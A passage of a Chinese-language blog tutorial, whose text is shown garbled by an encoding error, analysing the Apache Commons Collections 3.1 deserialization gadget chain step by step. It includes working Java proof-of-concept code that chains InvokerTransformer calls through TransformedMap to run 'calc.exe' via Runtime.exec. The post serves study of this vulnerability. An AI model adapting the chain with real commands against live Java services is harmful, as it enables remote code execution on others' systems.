<p><img src="https://img-blog.csdnimg.cn/20210323173051419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­æ‰§è¡Œï¼Œç”±äºæ¥å£å›è°ƒæ‰§è¡Œ<code>InvokerTransformer</code>çš„<code>transform</code>æ–¹æ³•ï¼ŒæˆåŠŸæ„æˆå‘½ä»¤æ‰§è¡Œé“¾ã€‚æ„é€ é“¾æ˜¯  <code>InvokerTransformer.transform()</code> =&gt; <code>Transformer.transform()</code><br><img src="https://img-blog.csdnimg.cn/202103231737566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»¥<code>reflectionChain</code>ç±»ä¸ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*çŸ¥é“äº†InvokerTransformer.transform()æ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤åï¼Œéœ€è¦çŸ¥é“è°è°ƒç”¨è¿™ä¸ªæ¥å£</span></span><br><span class="line"><span class="comment"> * å°±æ‰¾åˆ°äº†ConstantTransformerä»¥åŠChainedTransformer</span></span><br><span class="line"><span class="comment"> * ConstantTransformer.transform() å®ä¾‹åŒ–ä¼ å…¥çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * ChainedTransformer.transform() æŠŠä¸Šæ¬¡æ‰§è¡Œçš„ç»“æœå½“ä¸‹æ¬¡çš„å‚æ•°*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflectionChain</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//å®šä¹‰transformers æ•°ç»„</span></span><br><span class="line">		Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="comment">//åˆ©ç”¨äº†æ¥å£å›è°ƒç‰¹æ€§,æœ€åæ‰§è¡Œçš„æ˜¯InvokerTransformer.tranform()</span></span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">				)</span><br><span class="line">				&#125;;</span><br><span class="line">		<span class="comment">//ChainedTransformer chain = new ChainedTransformer(transformers);</span></span><br><span class="line">		<span class="comment">//æ¥å£å  å¯¹è±¡å =  new ç±»åï¼›åˆ©ç”¨äº†æ¥å£å›è°ƒç‰¹æ€§</span></span><br><span class="line">		Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">		<span class="comment">//æœ€åä¸€æ­¥è¿”å›Runtimeå¯¹è±¡ï¼Œä¼ é€’çš„æ–¹æ³•æ˜¯exec,å‚æ•°æ˜¯calc.exe</span></span><br><span class="line">		chain.transform(<span class="keyword">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="3ã€TransformedMap"><a href="#3ã€TransformedMap" class="headerlink" title="3ã€TransformedMap"></a>3ã€<font color=#ff9900 >TransformedMap</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ç°åœ¨<code>Transformer.transform</code>å¯ä»¥æ„é€ å‘½ä»¤æ‰§è¡Œé“¾ï¼Œä¸‹ä¸€æ­¥éœ€è¦æŸ¥æ‰¾è°è°ƒç”¨å®ƒï¼Œå…¶ä¸­ TransformedMap ç±»æœ‰è°ƒç”¨ã€‚å…¶ä¸­decorate ä¼šè°ƒâ½¤æ„é€ å‡½æ•°â½£æˆå®ä¾‹å¯¹è±¡, checkSetValue ä¼šè¿”å› Transformer å¯¹è±¡è°ƒâ½¤ transform æ–¹æ³•çš„ç»“æœï¼Œæ‰€ä»¥è¦æ‰§è¡Œdecorateå’ŒcheckSetValueæ–¹æ³•ã€‚</p>
<p><font color=#ff9900 >TransformedMap</font> è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/commons-collections-3.1.jar!/org/apache/commons/collections/map/TransformedMap.class</span><br></pre></td></tr></table></figure>
<p><font color=#ff9900 >Map</font> è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jdk/src.zip!/java/util/Map.java</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210323183656594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”±äº<code>TransformedMap</code>çš„æ„é€ æ–¹æ³•æ˜¯<code>protected</code>çš„ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨<code>TransformedMap</code>çš„æ„é€ æ–¹æ³•ç”Ÿæˆå®ä¾‹å¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”ŸæˆMapå¯¹è±¡</span></span><br><span class="line">Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="comment">//æ”¾å…¥é”®å€¼å¯¹</span></span><br><span class="line">innermap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="comment">//ç”Ÿæˆå®ä¾‹å¯¹è±¡</span></span><br><span class="line">Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, chain);</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„ä¹‹æ‰€ä»¥outmapå¯ä»¥ç”¨Mapæ¥é™å®šï¼Œæ˜¯åˆ©ç”¨äº†æ¥å£å›è°ƒçš„ç‰¹æ€§ã€‚</p>
<p><strong>é‡ç‚¹ï¼š</strong><br><font color=#ff6600><strong>TransformedMap extends  AbstractInputCheckedMapDecorator extends AbstractMapDecorator implements Map</strong></p>
<p>ç›¸å½“äºè¿™å‡ ä¸ªç±»éƒ½å®ç°Mapæ¥å£ã€‚</p>
<p>ç°åœ¨å®ä¾‹æœ‰äº†ï¼Œå·®ä¸€ä¸ªèƒ½å¤Ÿè¿”å›ç»“æœçš„transformæ–¹æ³•å»æ‰§è¡Œã€‚<br>æ„é€ é“¾ï¼š </p>
<p><code>InvokerTransformer.transform()</code> =&gt; <code>Transformer.transform()</code> =&gt; <code>TransformedMap.checkSetValue()</code></p>
<p>ä½†ç”±äºæ¥å£å›è°ƒçš„ç‰¹æ€§ï¼Œå¯ä»¥è½¬æ¢å¦‚ä¸‹ï¼š</p>
<p><code>InvokerTransformer.transform()</code> =&gt; <code>Transformer.transform()</code> =&gt; <code>Map.checkSetValue()</code><br>Mapç±»ä¼¼å…¬å…±æ¥å£ï¼Œå¯ä»¥æ‰¾åˆ°ä½¿ç”¨æ–¹æ³•<code>checkSetValue()</code>çš„ç±»å¯èƒ½æ€§æ›´å¤§ã€‚<br>å…¶ä¸­æœ‰<code>AbstractInputCheckedMapDecorator</code>ç±»æœ‰è°ƒç”¨ã€‚</p>
<h3 id="4ã€AbstractInputCheckedMapDecorator"><a href="#4ã€AbstractInputCheckedMapDecorator" class="headerlink" title="4ã€AbstractInputCheckedMapDecorator"></a>4ã€<font color=#ff6600>AbstractInputCheckedMapDecorator</h3><p>è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2021032319085022.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç®€åŒ–ä»£ç å¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210323191412621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<ul>
<li>MapEntry extends  AbstractMapEntryDecorator</li>
<li>AbstractMapEntryDecorator implements Entry</li>
<li>Entryä¸ºMapçš„å†…éƒ¨æ¥å£</li>
<li>Map.Entry.setvalue()ä¹Ÿå­˜åœ¨äºMapEntry.setValue()</li>
</ul>
<p>æ‰€ä»¥è°ƒç”¨setvalue()å°±å¯ä»¥è°ƒç”¨checkSetValue()ã€‚è¦æƒ³è°ƒç”¨setvalue()å°±è¦å®ä¾‹åŒ–ç±»<code>MapEntry</code>ï¼ŒæŸ¥æ‰¾ä¹‹åå‘ç°æ˜¯<code>AbstractInputCheckedMapDecorator.EntrySetIterator.next()</code> æ‰å¯ä»¥å®ç°ï¼š<br><img src="https://img-blog.csdnimg.cn/20210323194409470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€Œ<code>AbstractInputCheckedMapDecorator.EntrySetIterator.next()</code> æ˜¯ç”±<code>AbstractInputCheckedMapDecorator.EntrySet.iterator()</code> æ–¹æ³•å®ä¾‹åŒ–ã€‚<br><img src="https://img-blog.csdnimg.cn/20210323194602630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è€ŒEntrySetæ˜¯å†…éƒ¨ç±»ï¼Œè¿˜æ˜¯ç”±<code>AbstractInputCheckedMapDecorator.entrySet()</code> å®ä¾‹åŒ–ã€‚<br><img src="https://img-blog.csdnimg.cn/20210323195053820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>é‡ç‚¹ï¼š</strong><br><font color=#ff6600><strong>TransformedMap extends  AbstractInputCheckedMapDecorator extends AbstractMapDecorator implements Map</strong></p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹åˆ©ç”¨é“¾ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”Ÿæˆå®ä¾‹å¯¹è±¡</span></span><br><span class="line">Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, chain);</span><br><span class="line"><span class="comment">//æ³¨æ„ï¼šæ­¤æ—¶outmapçš„ç±»å‹å±äºTransformedMap,TransformedMapä¸å­˜åœ¨æ–¹æ³•entrySet()</span></span><br><span class="line"><span class="comment">//æ¥å£å›è°ƒï¼Œå»å¾€çˆ¶ç±»AbstractInputCheckedMapDecoratorå¯»æ‰¾æ–¹æ³•entrySet()</span></span><br><span class="line"><span class="comment">//æœ€ç»ˆè¿”å›AbstractInputCheckedMapDecorator$MapEntryå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">Map.Entry onlyElement = (Map.Entry) outmap.entrySet().iterator().next();</span><br><span class="line"><span class="comment">//Map.Entry.setvalue()ä¹Ÿå­˜åœ¨äºMapEntry.setValue()</span></span><br><span class="line"><span class="comment">//æ¥å£å›è°ƒï¼Œæ‰§è¡Œçš„æ˜¯MapEntryå¯¹è±¡çš„setValue()æ–¹æ³•</span></span><br><span class="line">onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);	</span><br></pre></td></tr></table></figure>


<p>æœ€ç»ˆè¿”å›ç±»å‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210323200735602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ­¤æ—¶æ„é€ ç±»<code>reflectionChain</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*çŸ¥é“äº†InvokerTransformer.transform()æ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤åï¼Œéœ€è¦çŸ¥é“è°è°ƒç”¨è¿™ä¸ªæ¥å£</span></span><br><span class="line"><span class="comment"> * å°±æ‰¾åˆ°äº†ConstantTransformerä»¥åŠChainedTransformer</span></span><br><span class="line"><span class="comment"> * ConstantTransformer.transform() å®ä¾‹åŒ–ä¼ å…¥çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * ChainedTransformer.transform() æŠŠä¸Šæ¬¡æ‰§è¡Œçš„ç»“æœå½“ä¸‹æ¬¡çš„å‚æ•°*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflectionChain</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//å®šä¹‰transformers æ•°ç»„</span></span><br><span class="line">		Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">						<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">				)</span><br><span class="line">				&#125;;</span><br><span class="line">		<span class="comment">//ChainedTransformer chain = new ChainedTransformer(transformers);</span></span><br><span class="line">		<span class="comment">//æ¥å£å  å¯¹è±¡å =  new ç±»åï¼›åˆ©ç”¨äº†æ¥å£å›è°ƒç‰¹æ€§</span></span><br><span class="line">		Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">		<span class="comment">//chain.transform(null);</span></span><br><span class="line">		<span class="comment">//ç”ŸæˆMapå¯¹è±¡</span></span><br><span class="line">		Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="comment">//æ”¾å…¥é”®å€¼å¯¹</span></span><br><span class="line">		innermap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">		<span class="comment">//ç”Ÿæˆå®ä¾‹å¯¹è±¡</span></span><br><span class="line">		Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, chain);</span><br><span class="line">		Map.Entry onlyElement = (Map.Entry) outmap.entrySet().iterator().next();</span><br><span class="line">		onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h3 id="5ã€AnnotationInvocationHandler"><a href="#5ã€AnnotationInvocationHandler" class="headerlink" title="5ã€AnnotationInvocationHandler"></a>5ã€<font color=#ff3300 >AnnotationInvocationHandler</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;å…¶å®åˆ°è¿™ä¸€æ­¥åˆ©ç”¨é“¾å·²ç»æˆåŠŸäº†ï¼Œåªæ˜¯è¦æƒ³ä½¿ç”¨readObjectè¯»å–åºåˆ—åŒ–æ–‡ä»¶åè‡ªåŠ¨è§¦å‘æ¼æ´ï¼Œè¿˜éœ€è¦ <code>AnnotationInvocationHandler</code>ç±»ã€‚</p>
<p>æ‰€åœ¨è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jdk/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦æ˜¯AnnotationInvocationHandlerç±»çš„readObject()å‡½æ•°ç†è§£ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">        <span class="comment">//å£°æ˜ä¸€ä¸ªannotationTypeçš„å˜é‡</span></span><br><span class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//è¿™é‡Œçš„typeæ˜¯æˆ‘ä»¬åœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼ å…¥çš„jdkè‡ªå¸¦çš„Target.class</span></span><br><span class="line">            <span class="comment">//ä¹‹å‰çš„pocè¯­å¥æ˜¯è¿™æ ·Object instance = ctor.newInstance(Target.class, outerMap);</span></span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//é»˜è®¤çš„æ˜¯&#123;valueï¼šElementType&#125;çš„é”®å€¼å¯¹</span></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="comment">//éå†memberValues</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        	<span class="comment">//è·å–memberValuesé”®value,æ‰§è¡Œå &quot;name&quot;-&gt;&quot;value&quot;</span></span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            <span class="comment">//è·å–é”®ä¸ºvalueçš„memberTypes,å¹¶èµ‹å€¼ç»™memberType,</span></span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="comment">//å¦‚æœå­˜åœ¨memberTypeä¸ä¸ºç©º</span></span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            	<span class="comment">//è·å–memberValueçš„valueé”®å¯¹åº”çš„å€¼ï¼Œèµ‹å€¼ç»™value</span></span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                <span class="comment">//valueä¸èƒ½å¼ºè½¬ä¸ºmemberType,ä¸”valueä¸æ˜¯ ExceptionProxyè¿™ç§ç±»å‹</span></span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                	<span class="comment">//æ‰§è¡ŒmemberValueçš„setValueæ–¹æ³•è§¦å‘æ¼æ´ï¼Œå‚æ•°ä¸ç”¨ç®¡</span></span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­æœ‰ï¼š <code>Class&lt;?&gt; memberType = memberTypes.get(name);</code><br><code>memberTypes</code>çš„é»˜è®¤çš„æ˜¯ {valueï¼šElementType} çš„é”®å€¼å¯¹ï¼Œå¦‚æœ<code>memberValues</code>ä¼ é€’è¿›æ¥çš„é”®ä¸æ˜¯valueï¼ˆ<code>innerMap.put(&quot;value&quot;, &quot;test&quot;);</code>ï¼‰ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œget()æ–¹æ³•æ—¶å°±è·å–ä¸åˆ°å¯¹åº”é”®ä¸ºçš„valueçš„å€¼ï¼Œifè¯­å¥å°±ä¸æˆç«‹ï¼Œæ•…è€Œä¸èƒ½æ‰§è¡ŒsetValue() æ–¹æ³•è§¦å‘æ¼æ´ã€‚</p>
<p>æœ€ç»ˆæ„é€ ç±»ï¼š<a href="#1"  style="text-decoration:underline;" >Serialize_Test_Poc</a>ã€‚<br>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/20210329104220805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h1 id="ä¸‰ã€è°ƒç”¨é“¾æ€»ç»“"><a href="#ä¸‰ã€è°ƒç”¨é“¾æ€»ç»“" class="headerlink" title="ä¸‰ã€è°ƒç”¨é“¾æ€»ç»“"></a>ä¸‰ã€è°ƒç”¨é“¾æ€»ç»“</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;è§¦å‘ä¹‹åäº§ç”Ÿè¿”å›å€¼ï¼Œè¿”å›åˆ°æœ€ç»ˆæ‰§è¡Œå‘½ä»¤calc.exe</p>
